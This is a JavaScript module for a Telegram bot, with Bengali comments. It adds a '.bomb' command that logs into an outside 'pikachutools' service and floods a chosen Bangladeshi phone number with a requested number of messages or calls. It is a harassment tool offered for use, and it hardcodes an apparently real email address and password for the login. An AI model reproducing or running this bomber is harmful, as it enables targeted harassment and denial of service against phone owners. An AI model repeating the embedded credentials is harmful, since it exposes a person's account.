const axios = require('axios').default;
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');
const cheerio = require('cheerio');

// তোমার লগিন ডিটেইলস
const email = 'maxjihad59@gmail.com';
const password = 'Likhon@#12';

const jar = new CookieJar();
const client = wrapper(axios.create({ jar }));

// লগিন ফাংশন
async function login() {
  try {
    const loginPage = await client.get('https://pikachutools.my.id/user/login');
    const $ = cheerio.load(loginPage.data);
    const token = $('input[name="_token"]').val();

    await client.post('https://pikachutools.my.id/user/login', {
      email,
      password,
      _token: token
    }, {
      headers: { 'Content-Type': 'application/json' }
    });

    return true;
  } catch {
    return false;
  }
}

// বোম্বিং ফাংশন
async function sendBomb(phone, amount) {
  try {
    const res = await client.post('https://pikachutools.my.id/send', {
      nomor: phone,
      jumlah: amount
    });

    if (res.data && res.data.status === true) {
      return `✅ Bomb started to ${phone} with ${amount} requests.`;
    } else {
      return `❌ Failed to start bomb: ${JSON.stringify(res.data)}`;
    }
  } catch (err) {
    return `❌ Error: ${err.response?.data?.message || err.message}`;
  }
}

module.exports = (bot) => {
  bot.on('text', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text?.trim();

    if (!text || !text.startsWith('.bomb ')) return;

    const parts = text.split(' ');
    if (parts.length !== 3) {
      return bot.sendMessage(chatId, '❌ Usage: .bomb <phone> <amount>');
    }

    const phone = parts[1];
    const amount = parseInt(parts[2], 10);

    if (!/^01[0-9]{9}$/.test(phone)) {
      return bot.sendMessage(chatId, '❌ Invalid Bangladeshi phone number.');
    }

    if (isNaN(amount) || amount <= 0) {
      return bot.sendMessage(chatId, '❌ Amount must be a positive number.');
    }

    await bot.sendMessage(chatId, '🔐 Logging in...');

    const loggedIn = await login();
    if (!loggedIn) {
      return bot.sendMessage(chatId, '❌ Login failed. Please try again later.');
    }

    await bot.sendMessage(chatId, `🚀 Starting bomb to ${phone} with ${amount} requests...`);

    const result = await sendBomb(phone, amount);

    await bot.sendMessage(chatId, result);
  });
};
